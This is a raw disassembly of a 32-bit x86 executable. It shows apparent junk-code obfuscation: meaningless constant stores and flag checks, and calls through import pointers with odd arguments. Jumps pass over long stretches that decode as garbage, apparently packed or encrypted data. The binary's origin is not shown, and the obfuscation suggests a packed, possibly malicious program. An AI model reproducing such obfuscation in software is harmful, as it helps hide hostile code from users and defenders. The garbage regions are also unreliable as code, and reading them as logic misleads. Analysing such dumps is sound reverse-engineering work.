  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x428397,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42817b,0x0
  420500:	mov    DWORD PTR ds:0x4282e3,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42827f
  42051b:	cmp    DWORD PTR ds:0x42817b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428eb8
  420543:	mov    esi,DWORD PTR ds:0x42816b
  420549:	sbb    DWORD PTR ds:0x428187,esi
  42054f:	and    DWORD PTR ds:0x428283,edx
  420555:	sbb    DWORD PTR ds:0x428237,edx
  42055b:	mov    esi,DWORD PTR ds:0x42836f
  420561:	or     DWORD PTR ds:0x428373,esi
  420567:	mov    esi,DWORD PTR ds:0x428197
  42056d:	mov    edx,DWORD PTR ds:0x42832f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42836f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428163,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x428387,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428223,0x2222
  4205bd:	not    DWORD PTR ds:0x428233
  4205c3:	cmp    DWORD PTR ds:0x428163,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x42838f
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e3c
  4205e8:	xor    edx,DWORD PTR ds:0x428237
  4205ee:	mov    ecx,DWORD PTR ds:0x42821f
  4205f4:	or     DWORD PTR ds:0x42814f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x4282c3
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x42838b,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42826b
  42061a:	xor    DWORD PTR ds:0x428257,edx
  420620:	movzx  ecx,WORD PTR ds:0x428243
  420627:	and    ecx,DWORD PTR ds:0x42837b
  42062d:	mov    DWORD PTR ds:0x428243,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x42838f,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	jl     0x42060a
  420670:	cmp    DWORD PTR [esp+ebp*4+0x1d],0x16
  420675:	sbb    BYTE PTR [ebx-0x10e7e7ee],ah
  42067b:	push   edi
  42067c:	leave  
  42067d:	ficomp WORD PTR [esi-0x11cc03ea]
  420683:	lahf   
  420684:	pop    ss
  420685:	cmp    dl,BYTE PTR [ebp-0x50a6ec47]
  42068b:	rcr    DWORD PTR [esi],1
  42068d:	loop   0x420664
  42068f:	add    al,0x24
  420691:	(bad)  
  420692:	cld    
  420693:	clc    
  420694:	pop    eax
  420695:	daa    
  420696:	arpl   WORD PTR [esi+0x7d],si
  420699:	add    DWORD PTR [edi],0x46cb35c3
  42069f:	je     0x4206d7
  4206a1:	mov    edi,ds
  4206a3:	cwde   
  4206a4:	cld    
  4206a5:	lock mov ch,0x4b
  4206a8:	out    0x4e,eax
  4206aa:	stos   DWORD PTR es:[edi],eax
  4206ab:	imul   ebp,DWORD PTR [ecx-0x7d],0xc1c002fb
  4206b2:	or     ebx,DWORD PTR [edx+ebp*1-0x4a782a93]
  4206b9:	sub    DWORD PTR [esi+ebx*8],ecx
  4206bc:	mov    eax,ds:0xea8be14b
  4206c1:	xchg   edi,eax
  4206c2:	test   eax,0xdcdaac29
  4206c7:	jnp    0x4206b0
  4206c9:	jno    0x42072a
  4206cb:	adc    dh,BYTE PTR [esi+0x72]
  4206ce:	mov    ds:0xd731379e,eax
  4206d3:	inc    eax
  4206d4:	xchg   esi,eax
  4206d5:	sbb    al,bh
  4206d7:	push   es
  4206d8:	xor    al,ah
  4206da:	repz retf 
  4206dc:	mov    ecx,0x783f8442
  4206e1:	in     al,0x3
  4206e3:	cld    
  4206e4:	push   0xffffff8d
  4206e6:	or     bh,BYTE PTR [ebp-0xd]
  4206e9:	stc    
  4206ea:	fs xor DWORD PTR es:[eax+0x63],ebp
  4206ef:	lock in eax,dx
  4206f1:	jmp    0xc883:0xe9e53df0
  4206f8:	xlat   BYTE PTR ds:[ebx]
  4206f9:	retf   
  4206fa:	or     eax,edi
  4206fc:	xchg   ebp,eax
  4206fd:	test   DWORD PTR [ecx-0x49c1535c],ecx
  420703:	pop    ecx
  420704:	cmp    eax,0xe5965ed7
  420709:	aas    
  42070a:	test   ecx,0x686bd6f2
  420710:	adc    esi,edi
  420712:	ficom  DWORD PTR [edi]
  420714:	cs mov cl,0x58
  420717:	jl     0x4206be
  420719:	out    dx,al
  42071a:	in     al,0x35
  42071c:	sub    eax,0xc1ca44c2
  420721:	dec    ebx
  420722:	lahf   
  420723:	jmp    0x32647b6b
  420728:	sahf   
  420729:	dec    esi
  42072a:	sbb    al,0x8e
  42072c:	mov    edx,0xd9f07cee
  420731:	add    al,0x1e
  420733:	push   ds
  420734:	sbb    dl,BYTE PTR [ecx-0x79d9b47a]
  42073a:	in     al,0x2
  42073c:	je     0x420772
  42073e:	inc    esi
  42073f:	push   DWORD PTR [edi+0x3624ea30]
  420745:	shufps xmm0,xmm4,0x58
  420749:	loope  0x4207a5
  42074b:	sub    BYTE PTR [edi*1+0x16425aa7],bl
  420752:	pop    edi
  420753:	jno    0x420743
  420755:	mov    edi,0x85314b4
  42075a:	dec    bp
  42075c:	push   ebp
  42075d:	lods   eax,DWORD PTR ds:[esi]
  42075e:	xor    bl,BYTE PTR [ecx+0x6cef43fe]
  420764:	rcl    bl,1
  420766:	inc    edx
  420767:	inc    ebp
  420768:	cmp    DWORD PTR [esi+0x6d4723a],0xd822e117
  420772:	fisub  WORD PTR [ebp+0x28]
  420775:	sahf   
  420776:	or     BYTE PTR [ebp+0x55],dl
  420779:	in     eax,0xc1
  42077b:	fisubr DWORD PTR [ebp+0x7a]
  42077e:	adc    dh,BYTE PTR [esi+0x109c5c1b]
  420784:	xchg   esp,eax
  420785:	aas    
  420786:	out    dx,al
  420787:	xchg   ebp,eax
  420788:	scas   eax,DWORD PTR es:[edi]
  420789:	outs   dx,BYTE PTR ds:[esi]
  42078a:	daa    
  42078b:	and    BYTE PTR ds:0x242de984,0x2
  420792:	mov    bl,0xbb
  420794:	fwait
  420795:	in     eax,dx
  420796:	(bad)  
  420797:	sar    BYTE PTR [edi+0x4d41632e],0x25
  42079e:	jae    0x420757
  4207a0:	xchg   DWORD PTR [edx],ebp
  4207a2:	aad    0x29
  4207a4:	retf   0x9a6f
  4207a7:	and    bh,BYTE PTR [ebp-0x6464c08f]
  4207ad:	pop    esi
  4207ae:	add    al,BYTE PTR [ebp-0x72cd175c]
  4207b4:	mov    BYTE PTR [ecx+0x172e2107],0x3a
  4207bb:	push   esi
  4207bc:	inc    ebp
  4207bd:	xchg   ebx,eax
  4207be:	hlt    
  4207bf:	sub    BYTE PTR [edx+0x4b],0x23
  4207c3:	sub    DWORD PTR [eax+0x4],edx
  4207c6:	jne    0x4207d6
  4207c8:	std    
  4207c9:	std    
  4207ca:	xor    DWORD PTR [edx-0x42],edx
  4207cd:	adc    eax,0x9f07229d
  4207d2:	je     0x4207f1
  4207d4:	sub    al,0xef
  4207d6:	push   ss
  4207d7:	mov    WORD PTR [edi+0x7c],ss
  4207da:	mov    eax,0x8155c17a
  4207df:	sub    BYTE PTR [eax+0x4b],al
  4207e2:	add    al,BYTE PTR [ecx]
  4207e4:	pop    ds
  4207e5:	call   0xf624adf7
  4207ea:	mov    ebp,0x30c5d43
  4207ef:	jno    0x4207ce
  4207f1:	mov    al,ds:0x8e5a0ea7
  4207f6:	xor    eax,0x9574e532
  4207fb:	fcom   QWORD PTR [ebx+0xb]
  4207fe:	xchg   ebx,eax
  4207ff:	loopne 0x42086d
  420801:	mov    ds:0xa0cac34c,eax
  420806:	push   es
  420807:	push   eax
  420808:	adc    BYTE PTR ds:0xfeb25d4d,ch
  42080e:	add    ebp,DWORD PTR [ebp+0x40]
  420811:	fdiv   QWORD PTR [edi+0x33]
  420814:	outs   dx,DWORD PTR ds:[esi]
  420815:	imul   ebx,DWORD PTR ds:0x63c14a66,0x1d
  42081c:	sub    bl,ch
  42081e:	push   edi
  42081f:	mov    es,WORD PTR [eax-0x15]
  420822:	mov    eax,0x58bc1d3
  420827:	mov    cl,0x8
  420829:	cmp    BYTE PTR [eax+edi*2],0x8b
  42082d:	mov    bh,0x92
  42082f:	jmp    0x2a94d0d1
  420834:	xchg   edi,ebx
  420836:	push   esp
  420837:	mov    al,0x6c
  420839:	jb     0x42083c
  42083b:	and    cl,bh
  42083d:	stc    
  42083e:	dec    eax
  42083f:	icebp  
  420840:	mov    bl,0xb1
  420842:	push   esp
  420843:	xchg   ecx,eax
  420844:	jg     0x4207cf
  420846:	int3   
  420847:	mov    esp,0x21aa4d7b
  42084c:	adc    al,0x6
  42084e:	cmp    al,ah
  420850:	mov    eax,ds:0x71c6bf97
  420855:	dec    ebx
  420856:	cmc    
  420857:	cwde   
  420858:	pop    esi
  420859:	iret   
  42085a:	xor    BYTE PTR [esi+0x1f81ffff],ch
  420860:	add    al,0x31
  420862:	leave  
  420863:	push   ecx
  420864:	in     eax,0x31
  420866:	out    0xd5,eax
  420868:	out    dx,al
  420869:	jns    0x42080b
  42086b:	pop    ecx
  42086c:	pushf  
  42086d:	jecxz  0x420819
  42086f:	iret   
  420870:	fwait
  420871:	xchg   edx,eax
  420872:	cmp    eax,0x866d8ad1
  420877:	and    al,0x13
  420879:	cmp    cl,bh
  42087b:	dec    edi
  42087c:	push   es
  42087d:	add    cl,BYTE PTR [ecx-0x1fd4a5da]
  420883:	sbb    ebp,0xffffffbf
  420886:	adc    ah,al
  420888:	lock (bad) 
  42088a:	cmp    BYTE PTR [ecx],al
  42088c:	cmp    edi,DWORD PTR [edi]
  42088e:	or     bl,BYTE PTR [ebp-0x3a]
  420891:	mov    ecx,0xbc8fed91
  420896:	or     ebx,DWORD PTR [ecx]
  420898:	(bad)  
  420899:	fisub  WORD PTR [ebp+0x54]
  42089c:	xor    DWORD PTR [edx],eax
  42089e:	lahf   
  42089f:	out    0x33,al
  4208a1:	pop    ss
  4208a2:	sub    ebx,DWORD PTR [edx+ebp*1+0x48]
  4208a6:	test   bl,0xc2
  4208a9:	push   cs
  4208aa:	arpl   WORD PTR [edi],dx
  4208ac:	push   ebx
  4208ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208ae:	sbb    eax,0x7adcb3f5
  4208b3:	inc    ecx
  4208b4:	in     eax,dx
  4208b5:	loope  0x42086a
  4208b7:	call   0xa647e658
  4208bc:	push   esp
  4208bd:	or     al,0x1a
  4208bf:	les    edx,FWORD PTR [esi+0x65f68c3b]
  4208c5:	adc    BYTE PTR [ecx+0x3e2008c6],ah
  4208cb:	sar    BYTE PTR [eax+0x25a93e36],cl
  4208d1:	js     0x420903
  4208d3:	jmp    0x4208ee
  4208d5:	mov    al,ds:0x1f18b11d
  4208da:	sbb    al,0xee
  4208dc:	pop    eax
  4208dd:	mov    edi,0xa6a4b214
  4208e2:	inc    edx
  4208e3:	mov    ?,WORD PTR [ebp+0x60]
  4208e6:	fsub   QWORD PTR [esi]
  4208e8:	and    al,0x30
  4208ea:	add    eax,0x742acabf
  4208ef:	iret   
  4208f0:	mov    bh,0x6e
  4208f2:	mov    dh,0xbe
  4208f4:	out    dx,al
  4208f5:	cmp    ebp,esi
  4208f7:	sbb    dl,bl
  4208f9:	adc    al,al
  4208fb:	ret    
  4208fc:	jbe    0x42093b
  4208fe:	inc    edx
  4208ff:	std    
  420900:	cmp    bl,ah
  420902:	sbb    DWORD PTR ds:0x8341ce27,0xffffffcc
  420909:	xchg   ecx,eax
  42090a:	mov    esi,0x42359eb5
  42090f:	gs add eax,0x3d317449
  420915:	mov    ecx,0x9e28f4cb
  42091a:	retf   0xea53
  42091d:	pop    eax
  42091e:	ins    DWORD PTR es:[edi],dx
  42091f:	add    DWORD PTR [edx],edi
  420921:	test   al,0xa1
  420923:	cmp    BYTE PTR [edi+0x53],al
  420926:	ret    
  420927:	mov    ah,0x8d
  420929:	inc    esp
  42092a:	add    BYTE PTR [ebx],0x6
  42092d:	push   0xffffffc8
  42092f:	retf   
  420930:	mov    esp,0xaacc82ca
  420935:	sbb    al,0x3d
  420937:	and    ecx,ebp
  420939:	ins    DWORD PTR es:[edi],dx
  42093a:	or     BYTE PTR [edx+0x18],cl
  42093d:	aaa    
  42093e:	cs push ds
  420940:	xor    DWORD PTR [eax-0x30],ebp
  420943:	jp     0x42096e
  420945:	push   edi
  420946:	jmp    0xe44:0x3a8ed93
  42094d:	bound  ebp,QWORD PTR [ecx+edi*4-0x59]
  420951:	xchg   ebp,eax
  420952:	nop
  420953:	hlt    
  420954:	xchg   esi,eax
  420955:	rol    BYTE PTR [eax+0x3],cl
  420958:	add    BYTE PTR [ecx-0x6e],bl
  42095b:	and    eax,0x2224e98c
  420960:	das    
  420961:	mov    ds:0x26369e01,eax
  420966:	pop    es
  420967:	and    BYTE PTR [esi],dl
  420969:	cli    
  42096a:	sahf   
  42096b:	inc    ebx
  42096c:	mov    ebp,0xe5da347c
  420971:	shr    DWORD PTR [ebx+0x2e],0xc
  420975:	arpl   WORD PTR [edx+ebx*4],cx
  420978:	(bad)
  42097c:	jl     0x420902
  42097e:	aaa    
  42097f:	adc    eax,0xbc13ff41
  420984:	dec    esi
  420985:	adc    eax,DWORD PTR [esi+0x7f]
  420988:	xor    bh,0x64
  42098b:	xchg   ecx,eax
  42098c:	sbb    DWORD PTR [ecx+eax*8-0x76],edx
  420990:	or     DWORD PTR [ecx-0x3d],esp
  420993:	pop    ebp
  420994:	jp     0x4209b6
  420996:	call   0x78e6d255
  42099b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42099c:	mov    ah,bh
  42099e:	pop    es
  42099f:	or     al,0xfe
  4209a1:	dec    DWORD PTR [eax]
  4209a3:	jp     0x420956
  4209a5:	or     BYTE PTR [ebp-0x25],bh
  4209a8:	xchg   ebp,eax
  4209a9:	push   edi
  4209aa:	mov    ch,0xbc
  4209ac:	adc    eax,0xed2269e
  4209b1:	mov    al,0x37
  4209b3:	and    ecx,DWORD PTR [ebx+0x408456a6]
  4209b9:	mov    DWORD PTR [ebp-0x94],0x561c
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428253
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x4282ef,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428317,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42822f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42815b,0x6139
  420a0d:	mov    DWORD PTR ds:0x428393,0x3849
  420a17:	cmp    DWORD PTR ds:0x428317,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e40
  420a34:	sub    DWORD PTR ds:0x4282eb,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42821f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42827b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x4282eb
  420a66:	sub    DWORD PTR ds:0x4282ff,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42815f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428273,0x0
  420a81:	mov    DWORD PTR ds:0x4282db,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428313
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42825b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428273,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e44
  420abd:	mov    esi,DWORD PTR ds:0x42835b
  420ac3:	or     DWORD PTR ds:0x428283,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x428193
  420ad1:	mov    esi,DWORD PTR ds:0x4283d7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42815b
  420ae2:	or     DWORD PTR ds:0x428283,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x4282e3,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0xa4
  420b0e:	xor    DWORD PTR [ecx],esi
  420b10:	mov    esi,0x18161736
  420b15:	mov    ds:0x91181812,eax
  420b1a:	sub    DWORD PTR [edx-0xa],0x48db9133
  420b21:	xchg   ebx,eax
  420b22:	jecxz  0x420b6f
  420b24:	or     eax,0x52df9a7d
  420b29:	int    0x1f
  420b2b:	(bad)  
  420b2c:	adc    al,0x29
  420b2e:	jle    0x420b44
  420b30:	inc    esi
  420b31:	es stos BYTE PTR es:[edi],al
  420b33:	imul   edi,ecx,0x236c9727
  420b39:	mov    DWORD PTR [ebx-0x57b69422],ebx
  420b3f:	or     esi,eax
  420b41:	and    eax,0x6a9b1fab
  420b46:	jle    0x420b35
  420b48:	test   al,0x8e
  420b4a:	add    eax,0x56b5a09c
  420b4f:	adc    DWORD PTR [esi],esi
  420b51:	leave  
  420b52:	out    0xc,eax
  420b54:	nop
  420b55:	fsub   st(7),st
  420b57:	pop    es
  420b58:	push   ss
  420b59:	xor    DWORD PTR [eax+0x7b42f8f7],ebp
  420b5f:	push   edi
  420b60:	push   ecx
  420b61:	xlat   BYTE PTR gs:[ebx]
  420b63:	hlt    
  420b64:	stos   BYTE PTR es:[edi],al
  420b65:	outs   dx,BYTE PTR ds:[esi]
  420b66:	fyl2xp1 
  420b68:	(bad)  
  420b69:	in     al,0x74
  420b6b:	push   ds
  420b6c:	stos   DWORD PTR es:[edi],eax
  420b6d:	push   edi
  420b6e:	fs and eax,0x9d5b4621
  420b74:	repz pop edi
  420b76:	cdq    
  420b77:	mov    dh,0xb6
  420b79:	jmp    0x2d8a4b20
  420b7e:	sbb    al,0x83
  420b80:	in     al,0xbd
  420b82:	adc    DWORD PTR [esi],edi
  420b84:	mov    ecx,0x80f26610
  420b89:	sbb    DWORD PTR [ecx],ebx
  420b8b:	push   edx
  420b8c:	ins    DWORD PTR es:[edi],dx
  420b8d:	popf   
  420b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b8f:	mov    dl,0x72
  420b91:	clc    
  420b92:	xor    bh,dl
  420b94:	sub    al,0x8
  420b96:	fimul  WORD PTR [ecx+edx*1-0x28]
  420b9a:	inc    esi
  420b9b:	dec    edx
  420b9c:	and    al,0x1b
  420b9e:	ja     0x420c13
  420ba0:	and    ecx,ebp
  420ba2:	std    
  420ba3:	into   
  420ba4:	mov    bh,0x3c
  420ba6:	cmp    DWORD PTR [ecx],edx
  420ba8:	stc    
  420ba9:	xor    DWORD PTR [ebp-0x6],eax
  420bac:	xchg   ecx,eax
  420bad:	inc    esi
  420bae:	(bad)  
  420baf:	fmul   QWORD PTR [esp+edx*8+0xd]
  420bb3:	xor    al,0xaa
  420bb5:	adc    eax,0xb58808f1
  420bba:	clc    
  420bbb:	retf   0x1803
  420bbe:	leave  
  420bbf:	or     ecx,DWORD PTR [edx+eiz*2]
  420bc2:	push   0xfffffff4
  420bc4:	pusha  
  420bc5:	lock mov ebx,0x813a6787
  420bcb:	neg    eax
  420bcd:	inc    ebx
  420bce:	repz push edi
  420bd0:	ret    
  420bd1:	out    0xca,al
  420bd3:	dec    ebp
  420bd4:	pop    ecx
  420bd5:	cmp    eax,0xed29f500
  420bda:	sub    eax,0xebd1baae
  420bdf:	cmp    BYTE PTR [ecx+0x28],dh
  420be2:	dec    edx
  420be3:	and    al,0x44
  420be5:	jl     0x420b97
  420be7:	inc    ebp
  420be8:	(bad)  
  420be9:	xor    eax,esp
  420beb:	(bad)  
  420bec:	aam    0x2d
  420bee:	mov    al,0xdf
  420bf0:	or     eax,DWORD PTR [esi]
  420bf2:	push   edx
  420bf3:	pop    ds
  420bf4:	pop    ss
  420bf5:	sbb    bl,dh
  420bf7:	xor    BYTE PTR [ebx+0x746ce28],dh
  420bfd:	or     al,0xff
  420bff:	imul   eax,DWORD PTR [edi+edx*4+0xe],0x49
  420c04:	and    edi,edi
  420c06:	pop    eax
  420c07:	inc    ecx
  420c08:	popa   
  420c09:	into   
  420c0a:	gs push eax
  420c0c:	leave  
  420c0d:	test   al,0x33
  420c0f:	inc    esi
  420c10:	sbb    al,0x13
  420c12:	(bad)
  420c16:	and    BYTE PTR [edx-0x17],0x7e
  420c1a:	or     edx,DWORD PTR [eax]
  420c1c:	xchg   DWORD PTR [edi+0x6e69f5d3],esp
  420c22:	pop    edi
  420c23:	sub    bh,BYTE PTR [edi]
  420c25:	ficom  DWORD PTR [ebx-0xe]
  420c28:	mov    dh,0x75
  420c2a:	(bad)  
  420c2b:	inc    edi
  420c2c:	jge    0x420c49
  420c2e:	pop    ds
  420c2f:	dec    edx
  420c30:	push   ss
  420c31:	out    0xfd,al
  420c33:	clc    
  420c34:	mov    ebx,cs
  420c36:	pop    esp
  420c37:	test   al,0xd5
  420c39:	mov    esi,0x7abf54a4
  420c3e:	or     eax,0xb99c2325
  420c43:	mov    dh,0xda
  420c45:	mov    ch,0x34
  420c47:	cs push ebp
  420c49:	(bad)  
  420c4a:	mov    ds:0xf3ac4943,eax
  420c4f:	pop    ecx
  420c50:	inc    esp
  420c51:	jne    0x420c9d
  420c53:	leave  
  420c54:	push   ss
  420c55:	dec    edi
  420c56:	clc    
  420c57:	mov    ds:0xc93c04c2,eax
  420c5c:	xor    eax,0x8a9cf305
  420c61:	cld    
  420c62:	or     BYTE PTR [edi+edx*8+0x48],0xd
  420c67:	aam    0xe5
  420c69:	adc    BYTE PTR [ebx],0x1b
  420c6c:	push   0x9a958434
  420c71:	ja     0x420c84
  420c73:	mov    esp,ss
  420c75:	sub    BYTE PTR [edx+0x6b],bl
  420c78:	lahf   
  420c79:	sub    BYTE PTR [ebx+0x1f],al
  420c7c:	xlat   BYTE PTR ds:[ebx]
  420c7d:	into   
  420c7e:	cmp    ebp,DWORD PTR [esi-0x24]
  420c81:	fisttp DWORD PTR [esi+0x75]
  420c84:	retf   
  420c85:	sub    al,0x84
  420c87:	adc    cl,ah
  420c89:	pop    esp
  420c8a:	push   ss
  420c8b:	xchg   esi,eax
  420c8c:	adc    edi,esp
  420c8e:	popf   
  420c8f:	sub    al,0x26
  420c91:	jnp    0x420d03
  420c93:	xor    BYTE PTR [ebx-0x7329b1c9],0x4e
  420c9a:	mov    ah,BYTE PTR [esi-0x18204cda]
  420ca0:	add    eax,0x2ecdbfe7
  420ca5:	sbb    dh,BYTE PTR [edi+0x1f6b03d4]
  420cab:	imul   ecx,DWORD PTR [ecx+eiz*8+0x3c],0x32924ec7
  420cb3:	push   esi
  420cb4:	ret    0xdd26
  420cb7:	pop    esp
  420cb8:	hlt    
  420cb9:	jne    0x420cd7
  420cbb:	test   BYTE PTR [edx],dl
  420cbd:	pop    ds
  420cbe:	sbb    dl,BYTE PTR [ecx+0x6a]
  420cc1:	inc    edx
  420cc2:	and    dh,BYTE PTR [ebx-0x4f]
  420cc5:	(bad)  
  420cc6:	push   ss
  420cc7:	loope  0x420d0e
  420cc9:	push   eax
  420cca:	les    ebp,FWORD PTR [eax]
  420ccc:	pop    esi
  420ccd:	jbe    0x420c83
  420ccf:	add    eax,0x3a844939
  420cd4:	add    esi,esi
  420cd6:	xchg   edx,eax
  420cd7:	sti    
  420cd8:	mov    WORD PTR [ebx],cs
  420cda:	shl    BYTE PTR [ecx-0x67],0xb
  420cde:	std    
  420cdf:	int    0x1a
  420ce1:	pusha  
  420ce2:	fwait
  420ce3:	sti    
  420ce4:	jmp    0x420ce9
  420ce6:	jg     0x420d67
  420ce8:	shl    DWORD PTR [eax+0x4c38ca47],0x79
  420cef:	dec    esi
  420cf0:	adc    edx,DWORD PTR [eax]
  420cf2:	xchg   ebp,eax
  420cf3:	div    BYTE PTR [esi-0x5df029b2]
  420cf9:	test   al,0x7f
  420cfb:	push   ds
  420cfc:	fsub   DWORD PTR ds:[edi]
  420cff:	jmp    0x420cf7
  420d01:	pop    edx
  420d02:	std    
  420d03:	mov    al,ds:0xfad50e36
  420d08:	je     0x420d01
  420d0a:	xor    ebx,esp
  420d0c:	sbb    BYTE PTR [ecx+0x4529fe18],0x53
  420d13:	xchg   edi,eax
  420d14:	ret    0x9e4d
  420d17:	mov    ebx,0xdb3461a9
  420d1c:	push   ecx
  420d1d:	cli    
  420d1e:	scas   eax,DWORD PTR es:[edi]
  420d1f:	jle    0x420d0b
  420d21:	clc    
  420d22:	pop    edi
  420d23:	dec    ebx
  420d24:	mov    ecx,0xa8dd92fd
  420d29:	aad    0xf6
  420d2b:	adc    ebx,esi
  420d2d:	retf   0xbc41
  420d30:	push   ds
  420d31:	mov    esp,DWORD PTR [edi-0x53b3c79a]
  420d37:	mov    cl,0x39
  420d39:	add    DWORD PTR [ebp-0x52caae3],esi
  420d3f:	sub    eax,DWORD PTR [eax+0x372f7d22]
  420d45:	aam    0x6f
  420d47:	outs   dx,DWORD PTR ds:[esi]
  420d48:	hlt    
  420d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d4a:	jg     0x420d80
  420d4c:	mov    bh,0xab
  420d4e:	jbe    0x420d42
  420d50:	jmp    0x420d38
  420d52:	pushf  
  420d53:	cwde   
  420d54:	add    DWORD PTR ds:0x7edf,esi
  420d59:	adc    esi,DWORD PTR [eax+0x6b]
  420d5c:	je     0x420d5c
  420d5e:	shl    ebp,0x8d
  420d61:	stos   BYTE PTR es:[edi],al
  420d62:	idiv   dh
  420d64:	aad    0xd0
  420d66:	push   es
  420d67:	(bad)  
  420d68:	nop
  420d69:	ins    DWORD PTR es:[edi],dx
  420d6a:	out    dx,eax
  420d6b:	test   al,0x95
  420d6d:	cli    
  420d6e:	mov    dl,0x2e
  420d70:	scas   al,BYTE PTR es:[edi]
  420d71:	es push cs
  420d73:	lods   eax,DWORD PTR ds:[esi]
  420d74:	loopne 0x420d71
  420d76:	push   eax
  420d77:	jno    0x420dd5
  420d79:	jle    0x420dac
  420d7b:	pop    edx
  420d7c:	fidiv  DWORD PTR [ebp-0x1b3c0c72]
  420d82:	jo     0x420d46
  420d84:	or     BYTE PTR [edx+edi*4-0x51a41e2],dl
  420d8b:	loope  0x420d6a
  420d8d:	cdq    
  420d8e:	pop    ds
  420d8f:	cdq    
  420d90:	or     al,0xc1
  420d92:	dec    ecx
  420d93:	fst    DWORD PTR [eax]
  420d95:	loopne 0x420dae
  420d97:	adc    al,0x70
  420d99:	rol    BYTE PTR [ebx],1
  420d9b:	iret   
  420d9c:	dec    ebp
  420d9d:	xor    al,0x66
  420d9f:	mul    DWORD PTR [edx+ebx*1]
  420da2:	mov    eax,ds:0x7fbc00a9
  420da7:	dec    esi
  420da8:	sub    eax,0x4862cc69
  420dad:	scas   al,BYTE PTR es:[edi]
  420dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420daf:	xlat   BYTE PTR ds:[ebx]
  420db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420db1:	nop
  420db2:	jns    0x420dc2
  420db4:	add    al,0x7d
  420db6:	add    ch,ah
  420db8:	and    ebx,DWORD PTR [ecx]
  420dba:	stc    
  420dbb:	sbb    ah,BYTE PTR [ebx+0x46]
  420dbe:	je     0x420e10
  420dc0:	mov    bh,0xd0
  420dc2:	popa   
  420dc3:	ret    0x2968
  420dc6:	xchg   ecx,eax
  420dc7:	fisub  WORD PTR [ebx+0x41]
